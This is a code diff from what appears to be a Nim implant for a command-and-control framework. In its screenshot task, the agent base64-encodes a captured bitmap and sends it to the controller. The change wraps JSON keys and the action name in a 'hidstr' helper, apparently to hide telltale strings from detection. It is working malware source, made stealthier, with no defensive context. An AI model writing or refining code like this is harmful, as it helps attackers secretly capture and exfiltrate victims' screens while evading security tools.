@@ -141,19 +141,20 @@ proc screenshotExecute(taskId: string, params: JsonNode, state: AgentState,
     copyMem(addr bmpStr[0], unsafeAddr bmpData[0], bmpData.len)
     let chunkB64 = encode(bmpStr)
 
-    let msg = %*{
-      "action": "post_response",
-      "responses": [%*{
-        "task_id": taskId,
-        "download": {
-          "total_chunks":  1,
-          "chunk_num":     1,
-          "chunk_data":    chunkB64,
-          "full_path":     "screenshot.bmp",
-          "is_screenshot": true,
-        },
-      }],
-    }
+    var dlNode = newJObject()
+    dlNode[hidstr("total_chunks")]  = %1
+    dlNode["chunk_num"]              = %1
+    dlNode["chunk_data"]             = %chunkB64
+    dlNode["full_path"]              = %"screenshot.bmp"
+    dlNode[hidstr("is_screenshot")] = %true
+
+    var innerResp = newJObject()
+    innerResp[hidstr("task_id")] = %taskId
+    innerResp["download"]         = dlNode
+
+    var msg = newJObject()
+    msg["action"]    = %hidstr("post_response")
+    msg["responses"] = %[innerResp]
     discard send(msg)
 
     return TaskResult(
